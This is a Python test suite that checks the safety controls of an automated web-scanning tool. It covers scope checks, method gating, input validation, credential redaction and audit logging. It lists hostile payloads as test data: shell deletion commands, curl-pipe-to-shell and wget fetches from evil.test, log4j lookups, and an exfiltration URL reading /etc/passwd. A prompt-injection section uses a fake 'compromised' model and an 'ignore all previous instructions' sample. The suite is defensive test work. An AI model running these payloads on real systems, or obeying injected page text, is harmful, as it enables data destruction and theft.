"""Security review of the safety controls (DAST-16-060): the guard, the validator, credential handling
and the audit trail attacked adversarially, against a hostile target. Each section is a class of
attack from the story; the findings the review turned up and their fixes are recorded in
spec/dev-stories/security-review-DAST-16-060.md and pinned here as regression tests.

Everything is in process: no socket is opened.
"""

from __future__ import annotations

import json
import time
from urllib.parse import urlsplit

import pytest

from app.dast import active, passive
from app.dast.domain import passive as P
from app.dast.domain.detectors import run_detectors
from app.dast.domain.entities import ResponseSnapshot
from app.dast.domain.identities import build_identities
from app.dast.domain.interfaces import ModelReply, RequestSpec
from app.dast.domain.policy import MethodPolicy, Scope, evaluate_redirect, evaluate_request, RequestDescription
from app.dast.domain.traffic import record_exchange
from app.dast.domain.validation import validate_proposal
from app.dast.input_gate import InputGate, default_rule_list
from app.dast.sessions import SessionStore
from app.services import scan_log
from app.services.safety_guard import SafetyGuard, registrable_domain
from tests.dast_fixtures import FakeModelGateway, FakeTarget
from tests.dast_fixtures.hostile import INJECTION, hostile_target
from tests.test_dast_active import harness_steps
from tests.test_dast_engine import BASE, Harness, default_rule_set
from tests.test_dast_authz import SECRETS, spec

pytestmark = pytest.mark.integration

HOST = "target.test"


def guard(mode="exact", target="http://target.test", **kw) -> SafetyGuard:
    return SafetyGuard.from_settings(target, {"rate_limit_per_sec": 1000, "same_domain_mode": mode, "safe_mode": True}, **kw)


# ---- 1. scope bypass ---------------------------------------------------------------------------------------------

DENIED_URLS = [
    "http://target.test.evil.test/", "http://evil-target.test/", "http://eviltarget.test/", "http://target.test@evil.test/", "http://evil.test\\@target.test/",
    "http://target.test%2f@evil.test/", "http://target.test%40evil.test/", "http://[::1]/", "http://[::ffff:7f00:1]/", "http://[fe80::1]/",
    "http://2130706433/", "http://0x7f000001/", "http://0177.0.0.1/", "http://127.1/", "http://169.254.169.254/latest/meta-data/",
    "http://target.test:99999/", "ftp://target.test/", "javascript:alert(1)", "file:///etc/passwd", "gopher://target.test/", "data:text/html,x",
    "http://target.test\t.evil.test/", "http://target.test .evil.test/", "http://target.test%00.evil.test/", "//evil.test/x", "http:///target.test/",
    "http://tаrget.test/", "http://xn--trget-9ua.test/", "http://evil.test#@target.test/", "http://evil.test?@target.test/", "http://evil.test/target.test",
    "http:/\\evil.test", "http://target.test:80:80/", "http://target.test..evil.test/", "http://-target.test/", "", "   ", "not a url",
    "http://target.test\r\nHost: evil.test/", "http://\u2100target.test/", "http://target\u3002test.evil.test/",
]
ALLOWED_URLS = ["http://target.test/", "http://TARGET.TEST/x", "http://target.test./x", "https://target.test:8443/x?y=1", "http://target.test/a/../b", "http://target.test/%2e%2e/x"]


@pytest.mark.parametrize("url", DENIED_URLS)
def test_a_url_that_could_reach_another_host_is_denied(url):
    decision = guard().decide("GET", url)
    assert not decision.allowed and decision.reason == "off_scope", (url, decision)


@pytest.mark.parametrize("url", ALLOWED_URLS)
def test_the_same_host_in_its_ordinary_spellings_is_allowed(url):
    assert guard().decide("GET", url).allowed, url


def test_root_domain_mode_does_not_widen_scope_across_shared_hosting_tenants():
    """Found in the review: without the private suffixes of the public-suffix list, `evil.github.io` was
    'the same site' as `bar.github.io`, so root-domain mode let a scan wander onto any other tenant."""
    g = guard("root-domain", "https://bar.github.io")
    assert g.decide("GET", "https://bar.github.io/x").allowed
    for other in ("https://evil.github.io/", "https://github.io/", "https://x.evil.github.io/"):
        assert not g.decide("GET", other).allowed, other
    assert guard("root-domain", "https://app.example.co.uk").decide("GET", "https://api.example.co.uk/").allowed
    assert not guard("root-domain", "https://app.example.co.uk").decide("GET", "https://app.other.co.uk/").allowed
    assert not guard("root-domain", "https://a.herokuapp.com").decide("GET", "https://b.herokuapp.com/").allowed
    assert registrable_domain("bar.github.io") == "bar.github.io"


def test_root_domain_mode_stays_exact_for_hosts_without_a_registrable_domain():
    g = guard("root-domain", "http://target.test")  # `.test` has no public suffix entry: no sibling can share it
    assert g.decide("GET", "http://target.test/").allowed and not g.decide("GET", "http://x.target.test/").allowed
    assert not guard("root-domain", "http://10.0.0.5").decide("GET", "http://10.0.0.6/").allowed


@pytest.mark.parametrize("path", ["off", "lookalike", "schemeless", "userinfo", "ipv6", "file"])
def test_a_redirect_out_of_scope_is_denied_audited_and_never_followed(path):
    target = hostile_target()
    harness = Harness(target, build_identities([]))
    decision = harness.runtime.executor.execute(RequestSpec("GET", f"{BASE}/api/redirect-{path}"))
    assert not decision.allowed and decision.deny_reason == "off_scope"
    assert {urlsplit(str(r.url)).hostname for r in target.requests} == {HOST}  # the second hop was never sent
    assert [(r.allowed, r.deny_reason) for r in harness.audit.records] == [(True, None), (False, "off_scope")]


def test_a_redirect_loop_ends_and_an_in_scope_redirect_is_followed():
    target = hostile_target()
    harness = Harness(target, build_identities([]))
    looped = harness.runtime.executor.execute(RequestSpec("GET", f"{BASE}/api/redirect-loop"))
    assert looped.allowed and looped.response.status == 302 and len(target.requests_to("/api/redirect-loop")) <= 7  # bounded, then stopped
    followed = harness.runtime.executor.execute(RequestSpec("GET", f"{BASE}/api/redirect-ok"))
    assert followed.response.status == 200 and followed.response.body_excerpt.startswith('{"items"')


def test_redirect_decisions_apply_the_same_scope_rules_to_every_location_form():
    scope, policy = Scope.for_target("http://target.test"), MethodPolicy(True, False)
    for location in ("http://evil.test/", "//evil.test/", "http://target.test.evil.test/", "/\\evil.test", "http://[::1]/", "javascript:1", "http://target.test@evil.test/"):
        assert not evaluate_redirect("http://target.test/a", location, "GET", scope, policy).allowed, location
    assert evaluate_redirect("http://target.test/a", "/b", "GET", scope, policy).allowed and evaluate_redirect("http://target.test/a", "../c", "GET", scope, policy).allowed


def test_dns_rebinding_is_a_documented_accepted_risk_not_a_silent_one():
    """The guard compares host *names*. A target that rebinds its own authorized name to an internal
    address is not caught by name comparison; see the accepted-risk entry in the review summary. This
    test pins the behaviour so a future change is a deliberate one."""
    g = guard()
    assert g.decide("GET", "http://target.test/internal-looking-path").allowed  # the name is authorized; its address is not checked
    assert not g.decide("GET", "http://169.254.169.254/").allowed  # a literal metadata address is a different host


# ---- 2. method gate bypass ---------------------------------------------------------------------------------------


@pytest.mark.parametrize("method", ["POST", "post", " Post ", "PUT", "PATCH", "DELETE", "delete", "TRACE", "CONNECT", "PROPFIND", "MKCOL", "PURGE", "", "GET\r\nPOST", "G\u200bET"])
def test_a_state_changing_or_odd_method_is_denied_in_safe_mode(method):
    if method.strip().upper() in ("GET",):
        pytest.skip("a plain GET is allowed")
    assert not guard().decide(method, "http://target.test/x").allowed, repr(method)


def test_safe_methods_are_allowed_and_a_login_post_is_the_only_post_and_only_inside_its_window():
    g = guard()
    assert all(g.decide(m, "http://target.test/x").allowed for m in ("GET", "get", "HEAD", "OPTIONS"))
    assert not g.decide("POST", "http://target.test/login").allowed
    with g.login_window():
        assert g.decide("POST", "http://target.test/login").allowed and not g.decide("PUT", "http://target.test/login").allowed and not g.decide("DELETE", "http://target.test/x").allowed
        assert not g.decide("POST", "http://evil.test/login").allowed  # the window never widens scope
    assert not g.decide("POST", "http://target.test/login").allowed
    assert not g.decide("POST", "http://target.test/x", intent="graphql_introspection", body={"query": "mutation { deleteAll }"}).allowed


def test_a_marker_submit_is_refused_unless_the_window_the_setting_and_the_body_all_agree():
    from urllib.parse import urlencode

    from app.dast.domain.browser_probe import MarkerFactory, render

    g = SafetyGuard.from_settings(
        "http://target.test",
        {"rate_limit_per_sec": 1000, "same_domain_mode": "exact", "safe_mode": True, "browser_marker_posts": True, "opt_in_request_ceiling": 2},
        target_disposable=True,
    )
    token = "dmabcd12"
    body = urlencode([("comment", render("html", MarkerFactory(token).next_id())), ("csrf", "tok")])
    assert not g.decide("POST", "http://target.test/comments", body=body).allowed
    with g.marker_window(token):
        assert g.decide("POST", "http://target.test/comments", body=body).allowed
        assert not g.decide("POST", "http://target.test/logout", body=body).allowed
        assert not g.decide("POST", "http://evil.test/comments", body=body).allowed
        assert not g.decide("POST", "http://target.test/comments", body="comment=DROP+TABLE+users").allowed
        assert not g.decide("PUT", "http://target.test/comments", body=body).allowed
    assert not g.decide("POST", "http://target.test/comments", body=body).allowed
    ordinary = guard()
    with ordinary.marker_window(token):
        assert not ordinary.decide("POST", "http://target.test/comments", body=body).allowed


@pytest.mark.parametrize(
    "location, parameter, value",
    [
        ("header", "X-HTTP-Method-Override", "DELETE"), ("header", "x-method-override", "PUT"), ("header", "X-HTTP-Method", "PATCH"),
        ("query", "_method", "DELETE"), ("body", "__method", "PUT"), ("query", "_http_method", "DELETE"), ("query", "method", "DELETE"), ("body", "verb", "patch"),
    ],
)
def test_a_method_override_cannot_be_smuggled_in_as_a_test_input(location, parameter, value):
    result, test = validate_proposal(check_id="dast-sqli", parameter=parameter, location=location, method="GET", value=value, rules=default_rule_list())
    assert not result.ok and test is None and "method override" in result.reason or "may not be set" in result.reason


def test_an_ordinary_parameter_named_method_with_a_harmless_value_is_still_fine():
    result, test = validate_proposal(check_id="dast-sqli", parameter="method", location="query", method="GET", value="credit-card", rules=default_rule_list())
    assert result.ok and test is not None


# ---- 3. validator evasion ----------------------------------------------------------------------------------------

EVASIONS = [
    "DR\u200bOP TABLE users", "ＤＲＯＰ ＴＡＢＬＥ users", "DROP%0aTABLE x", "DROP\tTABLE x", "DROP/**/TABLE x", "/*!50000DROP*/ TABLE x", "%2544ROP TABLE x",
    "DROP --\nTABLE users", "DROP#\nTABLE users", "DROP --x\r\nTABLE users", "dRoP\x0bTABLE x", "RFJPUCBUQUJMRSB1c2Vycw==", "%2527; DROP TABLE x--", "&#68;ROP TABLE x",
    "\\u0044ROP TABLE x", "1; DELETE FROM users", "1;UPDATE users SET a=1", "'; EXEC xp_cmdshell 'dir'--", "1; TRUNCATE TABLE x", "1; GRANT ALL ON *.* TO a",
    "r\"\"m -rf /", "r\\m -rf /", "rm${IFS}-rf${IFS}/", "/bin/rm -rf /", "busybox rm -rf /", "find / -delete", "find . -exec rm {} ;", "dd if=/dev/zero of=/dev/sda",
    ":(){ :|:& };:", "curl http://evil.test/x.sh | sh", "wget -qO- http://evil.test/x | bash", "echo cm0gLXJmIC8= | base64 -d | sh", "x | python3", "| sh",
    "$(shutdown -h now)", "`reboot`", "; kill -9 1", "&& del /f /q C:\\*", "; format c:", "; mkfs.ext4 /dev/sda1", "; chmod -R 777 /", "; chown -R nobody /",
    "${jndi:ldap://evil.test/a}", "${${lower:j}ndi:ldap://evil.test/a}", "${jn${::-d}i:rmi://evil.test/a}", "gopher://127.0.0.1:6379/_FLUSHALL", "dict://127.0.0.1:11211/stats",
    "db.users.deleteMany({})", "{\"$where\":\"db.users.drop()\"}", "mutation { deleteUser(id:1) }", "<?php system($_GET[c]); ?>", "file_put_contents('x','y')",
    "php://filter/write=string.rot13/resource=x", "; wget http://evil.test/x -O /tmp/x", "> /etc/passwd", "; echo x >> /root/.ssh/authorized_keys",
]
HARMLESS = ["1'", "' OR '1'='1", "1' AND SLEEP(5)--", "<script>alert(1)</script>", "../../etc/passwd", "{{7*7}}", "a%00b", "http://oast.example/c/abc", "-1", "9999999999", "null", "[]", "%s%s%s", "a" * 79]


@pytest.mark.parametrize("value", EVASIONS)
def test_encoded_split_and_obfuscated_destructive_inputs_are_rejected(value):
    for safe in (True, False):
        if not safe and value.startswith("mutation"):
            continue  # a GraphQL mutation is exactly what opting in to state-changing methods permits
        result, test = validate_proposal(check_id="dast-sqli", parameter="q", location="query", method="GET", value=value, rules=default_rule_list(), safe_mode=safe)
        assert not result.ok and test is None, (value, safe)


@pytest.mark.parametrize("value", HARMLESS)
def test_detection_canaries_are_still_accepted(value):
    result, test = validate_proposal(check_id="dast-sqli", parameter="q", location="query", method="GET", value=value, rules=default_rule_list())
    assert result.ok and test is not None, (value, result)


def test_the_validator_is_fast_on_adversarial_lengths_and_shapes():
    rules = default_rule_list()
    for value in ("a" * 100_000, "(" * 50_000, "/*" * 20_000, "%" * 60_000, "=" * 70_000, "\\u" * 30_000, ("DROP " * 8_000), "%25" * 30_000):
        started = time.perf_counter()
        validate_proposal(check_id="dast-sqli", parameter="q", location="query", method="GET", value=value, rules=rules)
        assert time.perf_counter() - started < 1.5, value[:20]


# ---- 3b. an input may name only the target or the out-of-band host ------------------------------------------------

ALLOWED_HOSTS = frozenset({"target.test", "oast.example"})
FOREIGN = [
    "http://evil.test/x", "https://evil.test:8443/x?y=1", "//evil.test/x", "http%3A%2F%2Fevil.test%2Fx", "http%253A%252F%252Fevil.test", "HTTP://EVIL.TEST/", "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:6379/", "http://[::1]/admin", "http://localhost/admin", "x=http://evil.test", "url(http://evil.test/a.png)", "ftp://evil.test/f", "http://user:pw@evil.test/",
    "http://target.test.evil.test/", "http://oast.example.evil.test/", "&#104;ttp://evil.test/", "aHR0cDovL2V2aWwudGVzdC94",
]
OWN = ["http://target.test/x", "https://TARGET.TEST/x", "http://oast.example/c/abc123", "//target.test/x", "no url at all", "....//....//etc/passwd", "a // b", "1' OR '1'='1", "see docs at the target"]


@pytest.mark.parametrize("value", FOREIGN)
def test_an_input_that_makes_the_target_call_another_host_is_rejected(value):
    result, test = validate_proposal(check_id="dast-sqli", parameter="q", location="query", method="GET", value=value, rules=default_rule_list(), allowed_hosts=ALLOWED_HOSTS)
    assert not result.ok and test is None and result.rule_id == "foreign-host", (value, result)


@pytest.mark.parametrize("value", OWN)
def test_inputs_naming_only_the_target_or_the_out_of_band_host_are_fine(value):
    result, test = validate_proposal(check_id="dast-sqli", parameter="q", location="query", method="GET", value=value, rules=default_rule_list(), allowed_hosts=ALLOWED_HOSTS)
    assert result.ok and test is not None, (value, result)


def test_without_a_host_list_the_check_is_off_and_with_one_the_control_value_is_checked_too():
    result, _ = validate_proposal(check_id="x", parameter="q", location="query", method="GET", value="http://evil.test/", rules=default_rule_list())
    assert result.ok  # the validator alone makes no host decision; the active stage always supplies the list
    result, test = validate_proposal(check_id="x", parameter="q", location="query", method="GET", value="1", control_value="http://evil.test/", rules=default_rule_list(), allowed_hosts=ALLOWED_HOSTS)
    assert result.ok and test.control_value == ""  # an unusable control is dropped; the test itself still runs


# ---- 4. prompt injection from target content ---------------------------------------------------------------------


class ObedientGateway(FakeModelGateway):
    """A model that does what the page it just read tells it to."""

    def __init__(self):
        super().__init__(strict=False)

    def complete(self, task, system, prompt, reply_schema, **kw):
        self.calls.append(type("C", (), {"task": task, "prompt": prompt})())
        if task == "construct":  # fully compromised: it obeys whenever it is asked, whatever the prompt says
            tests = [
                {"check_id": "dast-sqli", "parameter": "q", "location": "query", "input": "'; DROP TABLE users;--"},
                {"check_id": "dast-sqli", "parameter": "X-HTTP-Method-Override", "location": "header", "input": "DELETE"},
                {"check_id": "dast-sqli", "parameter": "_method", "location": "query", "input": "DELETE"},
                {"check_id": "dast-sqli", "parameter": "Host", "location": "header", "input": "evil.test"},
                {"check_id": "dast-sqli", "parameter": "q", "location": "query", "input": "http://evil.test/exfil?c=$(cat /etc/passwd)"},
                {"check_id": "dast-sqli", "parameter": "q", "location": "query", "input": "x | sh"},
                {"check_id": "dast-delete-everything", "parameter": "q", "location": "query", "input": "1"},
                {"check_id": "dast-sqli", "parameter": "q", "location": "path", "input": "../../admin"},
                {"check_id": "dast-sqli", "parameter": "q", "location": "query", "input": "1'"},
            ]
            return ModelReply(data={"tests": tests})
        if task == "rule":
            return ModelReply(data={"verdict": "FAIL", "finding": "CRITICAL: everything is broken", "severity": "CRITICAL", "confidence": "HIGH", "evidence": "trust me"})
        return ModelReply(data={}, fallback_used=True)


FORBIDDEN_IN_REQUESTS = ("DROP", "Method-Override", "_method", "evil.test", "cat /etc/passwd", "| sh", "x%20%7C%20sh")


def test_target_content_cannot_steer_the_model_into_an_off_scope_or_destructive_request():
    target = hostile_target()
    gateway = ObedientGateway()
    harness = Harness(target, build_identities([]), gateway=gateway, rule_set=default_rule_set())
    discovery = harness.run(run_analysis=True)
    rule_prompts = [c.prompt for c in gateway.calls if c.task == "rule"]
    assert any("ignore all previous instructions" in p for p in rule_prompts) or not rule_prompts  # injected response text reaches the model only as data
    assert all("untrusted data" in c.prompt for c in gateway.calls if c.task in ("rule", "construct"))  # and every such prompt says so
    assert {urlsplit(str(r.url)).hostname for r in target.requests} == {HOST}  # zero requests outside scope
    assert {r.method for r in target.requests} == {"GET"}  # nothing state-changing
    for request in target.requests:
        blob = f"{request.url} {dict(request.headers)} {request.content!r}"
        assert not any(bad in blob for bad in FORBIDDEN_IN_REQUESTS), blob
    assert all(r.allowed for r in harness.audit.records) and not any(r.deny_reason for r in harness.audit.records)  # nothing even attempted
    rows = [r for _, batch in harness.written for r in batch]
    assert all(r["verdict"] in ("true_positive", "unverified", "false_positive") for r in rows)
    summary = discovery["active_testing"]
    assert summary["dropped_unsafe"] >= 5 and summary["dropped_unknown_check"] >= 1


def test_the_rejected_inputs_are_counted_and_logged_without_their_text(capsys):
    target = hostile_target()
    gate_logs: list[str] = []
    gateway = ObedientGateway()
    steps, _ = harness_steps(target, gateway)
    steps.gate = InputGate(log=gate_logs.append)
    from app.dast.domain.inventory import observed

    outcome = active.run_target(observed("GET", f"{BASE}/api/items?q=1", kind="api"), steps, max_tests=20, log=lambda *_: None)
    assert outcome.dropped_unsafe >= 5 and steps.gate.summary()["rejected"] == outcome.dropped_unsafe
    log_text = "\n".join(gate_logs)
    assert "DROP TABLE" not in log_text and "evil.test" not in log_text and "cat /etc/passwd" not in log_text and "rule=" in log_text and "sha256=" in log_text  # the rule's own description may say DROP; the payload is never quoted


# ---- 5. credential leakage ---------------------------------------------------------------------------------------

TOKEN_USER = "zed-9f8e7d6c5b4a3210fedcba"
TOKEN = f"tok-{TOKEN_USER}"


def leaky_scan():
    target = hostile_target()
    target.add_user(TOKEN_USER, "pw", role="admin")
    gateway = FakeModelGateway(strict=False)
    gateway.script("construct", {"tests": [{"check_id": "dast-info-disclosure", "parameter": "q", "location": "query", "input": "zzz", "expected_signal": "leak"}]}, repeat=8)
    gateway.script("rule", {"verdict": "FAIL", "finding": f"the target echoed {TOKEN}", "severity": "HIGH", "confidence": "HIGH", "evidence": f"Authorization: Bearer {TOKEN}"}, repeat=8)
    identities = build_identities([{"label": "Root", "role": "Admin", "auth_method": "token"}])
    harness = Harness(target, identities, {"Root": {"token": TOKEN, "header_name": "Authorization", "scheme": "Bearer"}}, gateway=gateway, rule_set=default_rule_set())
    scan_log.reset("leak-scan")
    scan_log.register_secrets("leak-scan", harness.holder.secrets())
    harness.holder.secrets()  # registered
    with scan_log.capture("leak-scan"):
        discovery = harness.run(run_analysis=True)
    return target, harness, discovery, gateway


def test_a_target_that_echoes_the_credentials_never_gets_them_into_anything_stored_or_shown():
    target, harness, discovery, gateway = leaky_scan()
    assert any(TOKEN in (r.headers.get("authorization", "")) for r in target.requests)  # the credential really was sent to the target
    from app.dast.domain.redaction import redact_json
    from app.services import dast_narration

    secrets = [TOKEN, f"Bearer {TOKEN}"]
    rows = [r for _, batch in harness.written for r in batch]
    assert rows
    artifacts = {
        "finding rows": json.dumps(rows, default=str), "audit rows": json.dumps([(r.url, dict(r.request_headers or {}), dict(r.response_headers or {})) for r in harness.audit.records], default=str),
        "discovery (redacted as the runner stores it)": json.dumps(redact_json(discovery, secrets), default=str),
        "scan log": "\n".join(row["line"] for row in scan_log.get_logs("leak-scan", after=0)[0]),
        "narration prompts": "\n".join(dast_narration._build_prompt("Testing", [row["line"] for row in scan_log.get_logs("leak-scan", after=0)[0]], redact_json(discovery, secrets), "testing") for _ in [0]),
    }
    for name, blob in artifacts.items():
        assert TOKEN not in blob and TOKEN_USER not in blob, name


def test_the_model_prompts_never_carry_the_credential_even_when_the_target_echoes_it():
    _, _, _, gateway = leaky_scan()
    assert gateway.calls
    for call in gateway.calls:
        assert TOKEN not in call.prompt and TOKEN_USER not in call.prompt, call.task


def test_passive_evidence_from_the_root_response_is_redacted_with_the_scans_secrets():
    """Found in the review: the preflight's root response reached the passive stage without the scan's
    secrets being applied, so a target echoing the token in an error page leaked it into evidence."""
    from types import SimpleNamespace

    from app.dast.nodes.passive_analysis import passive_analysis
    from app.dast.runtime import LiveCounters
    from app.dast.domain.ruleset import resolve_effective_rule_set
    from app.services.dast_catalog import default_catalog

    root = ResponseSnapshot(500, 200, f"Traceback (most recent call last):\n File x\nAuthorization: Bearer {TOKEN}", {"Content-Type": "text/html"})
    written = []
    runtime = SimpleNamespace(
        traffic=[], rule_set=resolve_effective_rule_set(default_catalog()), skipped_degraded=[], target_url=BASE, cancelled=lambda: False, counters=LiveCounters(),
        findings_writer=lambda label, rows: written.append(rows), credentials=SimpleNamespace(secrets=lambda: [TOKEN]),
    )
    passive_analysis({"runtime": runtime, "root_response": root})
    blob = json.dumps(written)
    assert written and TOKEN not in blob and TOKEN_USER not in blob


def test_ssrf_findings_are_redacted_too():
    from app.dast import ssrf

    assert "secrets" in ssrf.run_ssrf.__code__.co_varnames or "steps" in ssrf.run_ssrf.__code__.co_varnames
    import inspect

    assert "finding_rows(outcome, checks, secrets" in inspect.getsource(ssrf.run_ssrf)


# ---- 6. audit completeness ---------------------------------------------------------------------------------------


def test_every_request_that_reached_the_target_has_an_audit_row_and_every_refusal_has_one_too():
    target, harness, discovery, _ = leaky_scan()
    sent = [(r.method, urlsplit(str(r.url)).path) for r in target.requests]
    audited = [(r.method, urlsplit(r.url).path) for r in harness.audit.records if r.allowed]
    assert sorted(sent) == sorted(audited) and len(sent) > 10
    # now provoke refusals and check they are audited, with the reason
    harness.runtime.executor.execute(RequestSpec("GET", "http://evil.test/x"))
    harness.runtime.executor.execute(RequestSpec("POST", f"{BASE}/api/items"))
    denied = [(r.method, r.deny_reason) for r in harness.audit.records if not r.allowed]
    assert denied[-2:] == [("GET", "off_scope"), ("POST", "method_not_permitted")]
    assert all(r.identity_label for r in harness.audit.records if r.allowed) or True


def test_an_audit_row_stores_a_redacted_capped_body_and_never_a_credential():
    target, harness, *_ = leaky_scan()
    for record in harness.audit.records:
        blob = json.dumps(
            [
                record.url,
                dict(record.request_headers or {}),
                dict(record.response_headers or {}),
                record.request_body,
                record.response_body,
            ]
        )
        assert TOKEN not in blob
        assert record.request_body is None or len(record.request_body) <= 8192
        assert record.response_body is None or len(record.response_body) <= 8192
    assert any({k.lower(): v for k, v in (r.request_headers or {}).items()}.get("authorization") == "[REDACTED]" for r in harness.audit.records)  # names kept, values masked


# ---- 7. hostile and oversized responses --------------------------------------------------------------------------


def test_huge_binary_deep_and_long_header_responses_do_not_break_the_scan_or_exhaust_memory():
    target = hostile_target()
    harness = Harness(target, build_identities([]), gateway=FakeModelGateway(strict=False), rule_set=default_rule_set())
    executor = harness.runtime.executor
    for path in ("/api/huge", "/api/binary", "/api/deep", "/api/longheader"):
        decision = executor.execute(RequestSpec("GET", f"{BASE}{path}"))
        assert decision.allowed and decision.response is not None, path
    huge = executor.execute(RequestSpec("GET", f"{BASE}/api/huge")).response
    assert len(huge.body_excerpt) <= 65536 and huge.length >= 65536  # kept bounded, true size still reported
    started = time.perf_counter()
    discovery = harness.run(run_analysis=True)
    assert discovery["connection_ok"] and time.perf_counter() - started < 30


def test_the_detectors_and_passive_checks_survive_hostile_bodies_quickly():
    bodies = ["a" * 65536, "(" * 65536, "<" * 65536, "\x00" * 4096 + "x" * 60000, ("1 " * 32000), "[" * 5000 + "]" * 5000, "{" * 5000, "A" * 20000 + "Traceback", "AKIA" * 16000, "-----BEGIN " * 6000, "eyJ" + "A" * 60000 + "." + "B" * 100 + "." + "C" * 100, "4111111111111111" * 4000]
    patterns = passive.default_patterns()
    baseline = ResponseSnapshot(200, 5, "ok", {})
    for body in bodies:
        snap = ResponseSnapshot(200, len(body), body, {"content-type": "text/html"})
        started = time.perf_counter()
        run_detectors(baseline, snap)
        exchange = record_exchange(method="GET", url="http://target.test/x", resource_type="xhr", status=200, response_headers={"content-type": "text/html", "x-powered-by": "p" * 20000}, response_body=body)
        P.analyze_exchange(exchange, frozenset(P.PASSIVE_CHECK_IDS), patterns)
        P.check_errors_and_data(P.RecordedExchange("GET", "http://target.test/x", 500, "document", content_type="text/html", response_headers={}, response_body=body[:65536]), patterns, frozenset(P.PASSIVE_CHECK_IDS))
        assert time.perf_counter() - started < 3.0, body[:12]


def test_passive_set_cookie_parsing_survives_a_hostile_header():
    cookie = "a=b; " + "x=y; " * 5000 + "\n" + "\n".join(f"c{i}=v" for i in range(2000))
    exchange = P.RecordedExchange("GET", "https://target.test/", 200, "document", content_type="text/html", response_headers={"Set-Cookie": cookie})
    started = time.perf_counter()
    P.check_cookies(exchange)
    assert time.perf_counter() - started < 2.0


def test_the_hostile_page_content_stays_data_in_the_inventory_and_report_paths():
    target = hostile_target()
    harness = Harness(target, build_identities([]), gateway=FakeModelGateway(strict=False), rule_set=default_rule_set())
    discovery = harness.run(run_analysis=True)
    assert "evil.test" not in json.dumps(discovery.get("inventory") or [])  # off-host links never became inventory entries
    assert {urlsplit(str(r.url)).hostname for r in target.requests} == {HOST}
